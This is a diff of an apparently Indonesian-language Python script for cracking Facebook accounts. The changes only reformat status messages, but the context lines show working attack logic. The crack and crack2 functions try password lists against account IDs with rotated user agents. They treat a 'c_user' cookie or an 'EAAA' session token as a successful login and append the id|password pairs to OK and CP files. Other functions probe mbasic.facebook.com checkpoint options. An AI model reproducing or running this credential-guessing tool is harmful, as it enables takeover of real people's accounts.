@@ -485,7 +485,7 @@ def setting():
 		method.append('api')
 	else:
 		method.append('mobile')
-	guw = '# INGIN OPSI CRACK?'
+	guw = '# INGIN CEK OPSI CRACK?'
 	sol().print(mark(guw, style='green'))
 	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
 	if osk in ['y','Y']:
@@ -540,7 +540,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s[Crack] %s/%s -> ok:%s -> cp:%s -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s[Crack] %s/%s -> [ok]:%s -> [cp]:%s -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
@@ -555,13 +555,13 @@ def crack(idf,pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					print('\r%s[-_-] %s|%s ----> CP       '%(b,idf,pw))
+					print('\r%s[-_-] %s|%s --> [CP]       '%(b,idf,pw))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s[>_<] %s|%s ----> OK       '%(h,idf,pw))
+				print('\r%s[>_<] %s|%s --> [OK]       '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
 				break
@@ -577,7 +577,7 @@ def crack2(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s[Crack] %s/%s -> ok:%s -> cp:%s -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s[Crack] %s/%s -> [ok]:%s -> [cp]:%s -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
@@ -589,13 +589,13 @@ def crack2(idf,pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					print('\r%s++++ %s|%s --> CP       '%(b,idf,pw))
+					print('\r%s[-_-] %s|%s --> [CP]       '%(b,idf,pw))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
 			elif "session_key" in resp.text and "EAAA" in resp.text:
-				print('\r%s[>_<] %s|%s --> OK       '%(h,idf,pw))
+				print('\r%s[>_<] %s|%s --> [OK]       '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
 				break
@@ -621,7 +621,7 @@ def ceker(idf,pw):
 			if anj.get('name') in lion:
 				data.update({anj.get('name'):anj.get('value')})
 		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
-		print('\r%s[-_-] %s|%s --> CP       %s'%(b,idf,pw,x))
+		print('\r%s[-_-] %s|%s --> [CP]       %s'%(b,idf,pw,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 		opsi = kent.find_all('option')
@@ -631,8 +631,8 @@ def ceker(idf,pw):
 			for opsii in opsi:
 				print('\r%s--> %s%s'%(kk,opsii.text,x))
 	except Exception as c:
-		print('\r%s[-_-] %s|%s --> CP       %s'%(b,idf,pw,x))
-		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
+		print('\r%s[-_-] %s|%s --> [CP]       %s'%(b,idf,pw,x))
+		print('\r%s--> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 
@@ -651,7 +651,7 @@ def cek_opsi():
 				id,pw = kes.split('|')[0],kes.split('|')[1]
 			except IndexError:
 				time.sleep(2)
-				print('\r%s[-_-] %s --> Error      %s'%(b,kes,x))
+				print('\r%s[-_-] %s --> [Error]      %s'%(b,kes,x))
 				print('\r%s--> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
 				continue
 			bi = random.choice([u,k,kk,b,h,hh])
@@ -670,7 +670,7 @@ def cek_opsi():
 						if anj.get('name') in lion:
 							data.update({anj.get('name'):anj.get('value')})
 					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
-					print('\r%s++++ %s|%s --> CP       %s'%(b,id,pw,x))
+					print('\r%s[-_-] %s|%s --> [CP]       %s'%(b,id,pw,x))
 					opsi = kent.find_all('option')
 					if len(opsi)==0:
 						print('\r%s[><] Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
@@ -678,12 +678,12 @@ def cek_opsi():
 						for opsii in opsi:
 							print('\r%s--> %s%s'%(kk,opsii.text,x))
 				except:
-					print('\r%s++++ %s|%s --> CP       %s'%(b,id,pw,x))
+					print('\r%s[-_-] %s|%s --> [CP]       %s'%(b,id,pw,x))
 					print('\r%s--> Tidak Dapat Mengecek Opsi%s'%(u,x))
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s[>_<] %s|%s --> OK       %s'%(h,id,pw,x))
+				print('\r%s[>_<] %s|%s --> [OK]       %s'%(h,id,pw,x))
 			else:
-				print('\r%s[-_-] %s|%s --> SALAH       %s'%(x,id,pw,x))
+				print('\r%s[-_-] %s|%s --> [SALAH]       %s'%(x,id,pw,x))
 			love+=1
 		except requests.exceptions.ConnectionError:
 			print('')
